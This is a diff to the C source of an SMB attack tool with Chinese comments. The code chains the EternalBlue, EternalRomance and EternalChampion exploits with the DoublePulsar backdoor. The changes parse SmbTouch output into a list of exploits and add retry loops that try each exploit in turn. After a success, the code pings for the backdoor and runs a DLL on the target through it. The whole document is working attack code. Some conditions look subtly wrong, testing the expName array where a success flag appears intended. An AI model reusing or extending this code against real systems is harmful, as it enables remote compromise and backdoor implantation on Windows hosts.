@@ -363,6 +363,23 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
         return EXP_ETROM_ERR_FAILED;
     }
 
+    pTmp = strstr(pRecvBuf, "TargetOsArchitecture");
+    if(pTmp != NULL)
+    {
+        if(strstr(pTmp, "x86") != NULL)
+        {
+            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
+            strcat(pTargetDesc->osArch, "x86");
+            printf("[+] Confirm target OS architecture: x86\n");
+        }
+        else if(strstr(pTmp, "x64") != NULL)
+        {
+            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
+            strcat(pTargetDesc->osArch, "x64");
+            printf("[+] Confirm target OS architecture: x64\n");
+        }
+    }
+
     return EXP_ETROM_SUCCESS;
 }
 
@@ -646,23 +663,6 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
         return EXP_ETBL_ERR_FAILED;
     }
 
-    pTmp = strstr(pRecvBuf, "TargetOsArchitecture");
-    if(pTmp != NULL)
-    {
-        if(strstr(pTmp, "x86") != NULL)
-        {
-            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
-            strcat(pTargetDesc->osArch, "x86");
-            printf("[+] Confirm target OS architecture: x86\n");
-        }
-        else if(strstr(pTmp, "x64") != NULL)
-        {
-            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
-            strcat(pTargetDesc->osArch, "x64");
-            printf("[+] Confirm target OS architecture: x64\n");
-        }
-    }
-
     return EXP_ETBL_SUCCESS;
 }
 
@@ -898,7 +898,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     }
     else
     {
-        strcat(pTargetDesc, "Unknown");
+        strcat(osArch, "Unknown");
     }
 
     if(strcmp(osVer, "XP") == 0)
@@ -976,7 +976,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     }
 
     //判断使用的exploit
-    pTmp = strstr(pRecvBuf, "vulnerable");
+    pTmp = strstr(pRecvBuf, "[vulnerable]");
     if(pTmp == NULL)
     {
         printf("[-] No exploit is available.\n");
@@ -988,18 +988,21 @@ int smb_touch(TARGET_DESC *pTargetDesc)
         {
             strcat(pTargetDesc->expName, "EternalBlue");
         }
-        else if(strstr(pTmp, "eternalromance") != NULL)
+        if(strstr(pTmp, "eternalromance") != NULL)
         {
+            if(strlen(pTargetDesc->expName) > 0)
+            {
+                strcat(pTargetDesc->expName, ";");
+            }
             strcat(pTargetDesc->expName, "EternalRomance");
         }
-        else if(strstr(pTmp, "eternalchampion") != NULL)
+        if(strstr(pTmp, "eternalchampion") != NULL)
         {
+            if(strlen(pTargetDesc->expName) > 0)
+            {
+                strcat(pTargetDesc->expName, ";");
+            }
             strcat(pTargetDesc->expName, "EternalChampion");
-        }
-        else
-        {
-            printf("[-] No exploit is available.\n");
-            return SMB_TOUCH_ERR_PARSE;
         }
     }
     else
@@ -1008,18 +1011,21 @@ int smb_touch(TARGET_DESC *pTargetDesc)
         {
             strcat(pTargetDesc->expName, "EternalRomance");
         }
-        else if(strstr(pTmp, "eternalblue") != NULL)
+        if(strstr(pTmp, "eternalblue") != NULL)
         {
+            if(strlen(pTargetDesc->expName) > 0)
+            {
+                strcat(pTargetDesc->expName, ";");
+            }
             strcat(pTargetDesc->expName, "EternalBlue");
         }
-        else if(strstr(pTmp, "eternalchampion") != NULL)
+        if(strstr(pTmp, "eternalchampion") != NULL)
         {
+            if(strlen(pTargetDesc->expName) > 0)
+            {
+                strcat(pTargetDesc->expName, ";");
+            }
             strcat(pTargetDesc->expName, "EternalChampion");
-        }
-        else
-        {
-            printf("[-] No exploit is available.\n");
-            return SMB_TOUCH_ERR_PARSE;
         }
     }
 
@@ -1033,16 +1039,22 @@ enum _attach_target_ret_
     ATTACK_SUCCESS = 0,
     ATTACK_ERR_CONN,
     ATTACK_ERR_TOUCH,
-    ATTACK_ERR_ETROM,
-    ATTACK_ERR_ETBL,
-    ATTACK_ERR_ETCHA,
+    ATTACK_ERR_EXP,
     ATTACK_ERR_NO_VUL,
     ATTACK_ERR_PING,
     ATTACK_ERR_IMPLANT,
 };
-int attack_target(TARGET_DESC *pTargetDesc)
+int attack_target(TARGET_DESC *pTargetDesc, int retryCount)
 {
     int retVal = 0;
+    char expName[100];
+    char *pTmp = NULL;
+    int expSucc = 0;
+    int dopuSucc = 0;
+    int runSucc = 0;
+    int idx = 0;
+
+    memset(expName, 0x00, sizeof(expName));
 
     //检测是否已存在后门
     if((retVal = implant_doublepulsar(pTargetDesc, "Ping")) != 0)
@@ -1053,17 +1065,28 @@ int attack_target(TARGET_DESC *pTargetDesc)
             printf("[-] Failed to establish connection.\n");
             return ATTACK_ERR_CONN;
         }
-        printf("[+] The target host does not seem to install DOPU.\n");
+        printf("[+] Target host does not seem to install DOPU.\n");
     }
     else
     {
         //已安装后门
-        printf("[+] The target host has DOPU installed.\n");
-        goto skip_run_dll;
+        printf("[+] Target host has DOPU installed.\n");
+        puts("------------------------------------------------------------------");
+        //植入DLL
+        if(implant_doublepulsar(pTargetDesc, "RunDLL") != 0)
+        {
+            printf("[-] Doublepulsar Failed.\n");
+        }
+        else
+        {
+            printf("[+] Doublepulsar Succeeded.\n");
+            puts("------------------------------------------------------------------");
+            return ATTACK_SUCCESS;
+        }
     }
-    puts("------------------------------------------------------------------");
 
     //获取目标系统信息
+    puts("------------------------------------------------------------------");
     if(smb_touch(pTargetDesc) != 0)
     {
         printf("[-] SmbTouch Failed.\n");
@@ -1078,66 +1101,118 @@ int attack_target(TARGET_DESC *pTargetDesc)
     printf("[+] Target OS Architecture: %s\n", pTargetDesc->osArch);
     printf("[+] Available pipe name: %s\n",
            strlen(pTargetDesc->pipeName) > 0 ? pTargetDesc->pipeName : "NULL");
-    printf("[+] Vulnerable: %s\n", pTargetDesc->expName);
-    puts("------------------------------------------------------------------");
+    printf("[+] Vulnerable: %s\n",
+           strlen(pTargetDesc->expName) > 0 ? pTargetDesc->expName : "NULL");
 
-    //利用exploit
-    if(strcmp(pTargetDesc->expName, "EternalRomance") == 0)
+    for(idx = 0; idx < retryCount; idx++)
     {
-        if(exp_eternalromance(pTargetDesc) != 0)
+        memset(expName, 0x00, sizeof(expName));
+        strcat(expName, pTargetDesc->expName);
+        if(strlen(expName) <= 0)
         {
-            printf("[-] EternalRomance Failed.\n");
-            return ATTACK_ERR_ETROM;
+            printf("[-] No Vulnerable.\n");
+            return ATTACK_ERR_NO_VUL;
         }
-        printf("[+] EternalRomance Succeeded.\n");
-    }
-    else if(strcmp(pTargetDesc->expName, "EternalBlue") == 0)
-    {
-        if(exp_eternalblue(pTargetDesc) != 0)
-        {
-            printf("[-] EternalBlue Failed.\n");
-            return ATTACK_ERR_ETBL;
-        }
-        printf("[+] EternalBlue Succeeded.\n");
-    }
-    else if(strcmp(pTargetDesc->expName, "EternalChampion") == 0)
-    {
-        if(exp_eternalchampion(pTargetDesc) != 0)
-        {
-            printf("[-] EternalChampion Failed.\n");
-            return ATTACK_ERR_ETCHA;
-        }
-        printf("[+] EternalChampion Succeeded.\n");
-    }
-    else
-    {
-        printf("[-] No Vulnerable.\n");
-        return ATTACK_ERR_NO_VUL;
-    }
-    puts("------------------------------------------------------------------");
 
-    //检测后门是否植入成功
-    if(implant_doublepulsar(pTargetDesc, "Ping") != 0)
+        pTmp = strtok(expName, ";");
+        while(pTmp != NULL)
+        {
+            expSucc = 0;
+            dopuSucc = 0;
+            runSucc = 0;
+            //利用exploit
+            puts("------------------------------------------------------------------");
+            if(strcmp(pTmp, "EternalRomance") == 0)
+            {
+                if(exp_eternalromance(pTargetDesc) != 0)
+                {
+                    printf("[-] EternalRomance Failed.\n");
+                }
+                else
+                {
+                    printf("[+] EternalRomance Succeeded.\n");
+                    expSucc = 1;
+                }
+            }
+            else if(strcmp(pTmp, "EternalBlue") == 0)
+            {
+                if(exp_eternalblue(pTargetDesc) != 0)
+                {
+                    printf("[-] EternalBlue Failed.\n");
+                }
+                else
+                {
+                    printf("[+] EternalBlue Succeeded.\n");
+                    expSucc = 1;
+                }
+            }
+            else if(strcmp(pTmp, "EternalChampion") == 0)
+            {
+                if(exp_eternalchampion(pTargetDesc) != 0)
+                {
+                    printf("[-] EternalChampion Failed.\n");
+                }
+                else
+                {
+                    printf("[+] EternalChampion Succeeded.\n");
+                    expSucc = 1;
+                }
+            }
+            else
+            {
+                printf("[-] No Vulnerable.\n");
+                return ATTACK_ERR_NO_VUL;
+            }
+
+            pTmp = strtok(NULL, ";");
+            if(expSucc)
+            {
+                //检测后门是否植入成功
+                puts("------------------------------------------------------------------");
+                if(implant_doublepulsar(pTargetDesc, "Ping") != 0)
+                {
+                    printf("[-] Doublepulsar Failed.\n");
+                }
+                else
+                {
+                    printf("[+] Doublepulsar Succeeded.\n");
+                    dopuSucc = 1;
+                }
+            }
+
+            if(expSucc && dopuSucc)
+            {
+                puts("------------------------------------------------------------------");
+                //植入DLL
+                if(implant_doublepulsar(pTargetDesc, "RunDLL") != 0)
+                {
+                    printf("[-] Doublepulsar Failed.\n");
+                }
+                else
+                {
+                    printf("[+] Doublepulsar Succeeded.\n");
+                    runSucc = 1;
+                }
+            }
+
+            if(expName && dopuSucc && runSucc)
+                break;
+        }
+        if(expName && dopuSucc && runSucc)
+            break;
+    }
+
+    if(expName == 0)
     {
-        printf("[-] Doublepulsar Failed.\n");
+        return ATTACK_ERR_EXP;
+    }
+    if(dopuSucc == 0)
+    {
         return ATTACK_ERR_PING;
     }
-    else
+    if(runSucc == 0)
     {
-        printf("[+] Doublepulsar Succeeded.\n");
-    }
-
-skip_run_dll:
-    puts("------------------------------------------------------------------");
-    //植入DLL
-    if(implant_doublepulsar(pTargetDesc, "RunDLL") != 0)
-    {
-        printf("[-] Doublepulsar Failed.\n");
         return ATTACK_ERR_IMPLANT;
-    }
-    else
-    {
-        printf("[+] Doublepulsar Succeeded.\n");
     }
 
     return ATTACK_SUCCESS;
